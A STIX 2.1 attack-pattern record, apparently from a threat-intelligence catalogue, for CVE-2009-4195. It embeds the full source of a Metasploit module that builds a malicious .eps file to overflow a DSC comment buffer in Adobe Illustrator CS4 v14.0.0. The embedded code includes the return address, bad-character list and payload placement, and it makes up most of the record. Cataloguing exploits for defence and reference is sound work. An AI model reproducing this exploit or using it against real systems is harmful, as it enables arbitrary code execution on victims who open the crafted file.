{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--06bd5b23-ef4e-4220-93a8-efa32a0b48b9",
    "created": "2024-08-14T16:36:07.54451Z",
    "modified": "2024-08-14T16:36:07.544514Z",
    "name": "Adobe Illustrator CS4 v14.0.0",
    "description": " Adobe Illustrator CS4 (V14.0.0) Encapsulated Postscript (.eps) overlong DSC Comment Buffer Overflow Exploit  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_illustrator_v14_eps.rb",
            "external_id": "adobe_illustrator_v14_eps.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4195"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Illustrator CS4 v14.0.0',\n      'Description'    => %q{\n          Adobe Illustrator CS4 (V14.0.0) Encapsulated Postscript (.eps)\n        overlong DSC Comment Buffer Overflow Exploit\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n          'pyrokinesis', # Of Nine:Situations:Group\n          'dookie'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-4195' ],\n          [ 'BID', '37192' ],\n          [ 'OSVDB', '60632' ],\n          [ 'EDB', '10281' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'DisablePayloadHandler' => true,\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x0D\\x0C\\x0A\",\n          'EncoderType' => Msf::Encoder::Type::AlphanumUpper,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x4B4B5173 } ], # CALL ESI in icudt36.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-12-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.eps']),\n      ])\n  end\n\n  def exploit\n\n    header = \"\\xc5\\xd0\\xd3\\xc6\\x20\\x00\\x00\\x00\\x05\\xc8\\x04\\x00\\x00\\x00\"\n    header << \"\\x00\\x00\\x00\\x00\\x00\\x00%\\xc8\\x04\\x00\\xb5I\\x01\\x00\\xff\"\n    header << \"\\xff\\x00\\x00\"\n    header << \"%!PS-Adobe-3.1\\x20EPSF-3.0\\r\\n\"\n    header << \"%ADO_DSC_Encoding:\\x20Windows\\x20Roman\\r\\n\"\n    header << \"%\"\n    sploit = rand_text_alpha(41699)\n    sploit << [target.ret].pack('V')\n    sploit << rand_text_alpha(2291)\n    sploit << \"%Title:\\x20Untitled-1.eps\\r\\n\"\n    sploit << \"%AAAAAAAA\"\n    sploit << payload.encoded\n    trailer = \": A\\r\\n\"\n    trailer << \"%%For:\\x20alias\\r\\n\"\n    trailer << \"%%CreationDate:\\x2011/27/2009\\r\\n\"\n    trailer += \"%%BoundingBox:\\x200\\x200\\x20227\\x20171\\r\\n\"\n    trailer += \"%%HiResBoundingBox:\\x200\\x200\\x20226.5044\\x20170.3165\\r\\n\"\n    trailer += \"%%CropBox:\\x200\\x200\\x20226.5044\\x20170.3165\\r\\n\"\n    trailer += \"%%LanguageLevel:\\x202\\r\\n\"\n    trailer += \"%%DocumentData:\\x20Clean7Bit\\r\\n\"\n    trailer += \"%ADOBeginClientInjection:\\x20DocumentHeader\\x20\\\"AI11EPS\\\"\\r\\n\"\n    trailer += \"%%AI8_CreatorVersion:\\x2014.0.0\\r\"\n    trailer += \"%AI9_PrintingDataBegin\\r\"\n    trailer += \"%ADO_BuildNumber:\\x20Adobe\\x20Illustrator(R)\\x2014.0.0\\x20x367\\x20R\\x20agm\\x204.4890\\x20ct\\x205.1541\\r\"\n    trailer += \"%ADO_ContainsXMP:\\x20MainFirst\\r\"\n    trailer += \"%AI7_Thumbnail:\\x20128\\x2096\\x208\\r\"\n    trailer += \"%%BeginData:\\x204096\\x20Hex\\x20Bytes\\r\"\n    trailer += \"%0000330000660000990000CC0033000033330033660033990033CC0033FF\\r\\n\"\n\n    eps = header + sploit + trailer\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(eps)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-12-03",
    "x_mitre_platforms": [
        "win'"
    ]
}